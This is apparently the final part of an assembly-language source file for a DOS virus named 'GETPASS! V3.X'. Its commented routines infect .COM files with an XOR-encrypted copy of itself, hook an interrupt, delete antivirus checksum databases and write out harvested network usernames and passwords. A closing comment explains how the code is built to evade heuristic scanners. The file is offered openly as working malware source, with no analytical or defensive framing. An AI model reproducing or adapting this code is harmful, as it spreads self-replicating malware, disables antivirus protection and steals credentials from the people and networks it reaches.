READY:  MOV     AH,3Eh                  ;Close file.
	INT     21h                     ;Call DOS.
	PUSH    DS                      ;
	MOV     AX,0044h                ;
	mov     DS,AX                   ;Restore data segment.
	MOV     BYTE PTR[DS:0100],01h   ;Already printed the file?
	POP     DS                      ;
NOPRINT:RET                             ;Return to caller.
;-----------------------------------------------------------------------------
INSTSR2:LEA     DI,[BP+OFFSET NEW_DTA+0100h];/
	LEA     SI,[BP+OFFSET INFECT]   ;Offset address infection routine.
	MOV     CX,TSR2LEN              ;Length to install.
	REP     MOVSB                   ;Install it.
	MOV     AX,25D0h                ;Give up new INT D0 vector.
	LEA     DX,[BP+OFFSET NEW_DTA+0100h];
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
PRINT   DB      'PRN',0                 ;Device=printer.
PATH    DB      'PATH='                 ;Used to find environment.
SPEC    DB      '*.COM',0               ;File search specification.
TXT     DB      '.TXT',0                ;Rename file specification.
OUTPUT  DB      0                       ;Output byte to printer.
TXTPOI  DW      0                       ;Pointer in specification.
MARK1   DB      0                       ;Used for infection check.
VAL_2   DB      0                       ;Random value for directory switching.
OLDRV   DB      0                       ;Old drive code.
BYTES   DB      'TBDRVX',0              ;
COMMND  DB      'COMM',0                ;
MICRO   DB      'CHKLIST.MS',0          ;- Files to be deleted.
CENTRAL DB      'CHKLIST.CPS',0         ;/
TBAV    DB      'ANTI-VIR.DAT',0        ;/
VIRNAME DB      'GETPASS! V3.X',0       ;
BEGIN2  DW      0                       ;
NWJMP1  DB      0EBh,0                  ;
FLAGT   DB      0                       ;
OLD_DTA DW      0                       ;Old DTA addres.
HANDLE  DW      0                       ;File handle.
TIME    DB      2 DUP (?)               ;File time.
DATE    DB      2 DUP (?)               ;File date.
ATTR    DB      1 DUP (?),0             ;Attributes.
NEWJMP  DB      0E9h,0,0                ;Jump replacement.
ORIGNL  DB      0CDh,020h,090h          ;Original instrucitons.
DEXIT   DB      0CDh,020h,090h          ;Dummy exit instructions.
NEWNAM  DB      0Dh DUP (?)             ;New file name.
OLDINT  DW      0                       ;Old INT 24 vector.
NP      DW      ?                       ;New DTA address.
;-----------------------------------------------------------------------------
INFECT: PUSH    BX                      ;Save file handle.
	PUSH    DX                      ;Save encryption key.
	PUSH    BX                      ;Save file handle.
	CALL    ENCRYPT                 ;Encrypt the virus code.
	POP     BX                      ;Restore file handle.
	LEA     DX,[BP+OFFSET VSTART]   ;Begin here.
	MOV     CX,VIRLEN               ;Write this many Bytes.
	MOV     AH,40h                  ;Write to file.
	INT     21h                     ;Call DOS.
	POP     DX                      ;Restore encryption value.
	CALL    ENCRYPT                 ;Fix up the mess.
	POP     BX                      ;Restore file handle.
DUMMY:  IRET                            ;Return to caller.
;-----------------------------------------------------------------------------
CREATE: MOV     AH,5Bh                  ;Create file function.
	LEA     DX,[BP+OFFSET FNAME]    ;Offset file spec.
	MOV     CX,0                    ;Normal attributes.
	INT     21h                     ;Call DOS.
	JC      EXISTS                  ;File already excists, do the rest.
	XCHG    AX,BX                   ;File handle into BX.
	MOV     CX,INTRO                ;Lenght of intro.
	LEA     DX,[BP+OFFSET INAME]    ;Offset text.
	MOV     AH,40h                  ;Write to file function.
	INT     21h                     ;Call DOS.
EXISTS: RET                             ;Return to caller.
INAME:  DB      'You are now looking at the name/passwords of '
	DB      'your network!  ',CR,LF
        DB      'Greetings, ThE wEiRd GeNiUs.',CR,LF
	DB      'Check your MSD.INI once in a while!',CR,LF,CR,LF
LBIT:   DB      0
;-----------------------------------------------------------------------------
;Comment: From here the code remains UN-encrypted.
;-----------------------------------------------------------------------------
CHKTIME:MOV     AH,2Ch                  ;Get system time.
	INT     21h                     ;Call DOS.
	CMP     DL,0                    ;If zero,
	JE      CHKTIME                 ;try again.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
CHKDOS: MOV     AH,30h                  ;Get DOS version.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
VAL_1   DB      00h                     ;Encryption Value.
;-----------------------------------------------------------------------------
;Encrypting the virus code is not longer the most important thing to do since
;some of the anti-viral software can decrypt and trace the virus code in a
;simulated way. The en/de-cryption routine is almost the only piece of
;code that stays readable and if it is not a polymorphic virus this code
;always stays the same. The only way we can misguide a heuristic
;scanner is to 'tell' it that we are a normal, respectable program. By first
;performing a set of 'normal' instructions we mislead the scanner until it
;stops tracing the program. The result is that the en/decryption routine is
;not discovered. Since there are no other suspicious instructions in the code
;we remain under cover. This is why I used a very simple encryption method.
;-----------------------------------------------------------------------------
ENCRYP: CALL    NEXTL                   ;-Get BP on address.
NEXTL:  POP     BX                      ;/
	SUB     BX,04                   ;[BX]=decryption key.
	MOV     DL,[BX]                 ;DL=[BX]
	SUB     BX,LENGTH               ;BX=begin of encrypted code.
	CMP     DL,0                    ;Code Encrypted?
	JE      NOTENC                  ;Nope
	JMP     DECRYPT                 ;Decrypt.
ENCRYPT:LEA     BX,[BP+OFFSET CSTART]   ;De/en-crypt from here.
DECRYPT:MOV     DH,DL                   ;
	MOV     CX,CRYPTLEN             ;Set counter.
X_LOOP: XOR     [BX],DL                 ;Xor the code on address BX.
	SUB     DL,DH                   ;-To change form of scrambled code.
	SUB     DH,02Eh                 ;/
	INC     BX                      ;Increase address.
	LOOP    X_LOOP                  ;Repeat until done.
NOTENC: RET                             ;Return to caller.
;-----------------------------------------------------------------------------
BUFFER: DB      64 DUP (?)              ;Here we store directory info.
;-----------------------------------------------------------------------------
NEW_DTA:                                ;Here we put the DTA copy.
;-----------------------------------------------------------------------------
CODE ENDS
END START
;=============================================================================
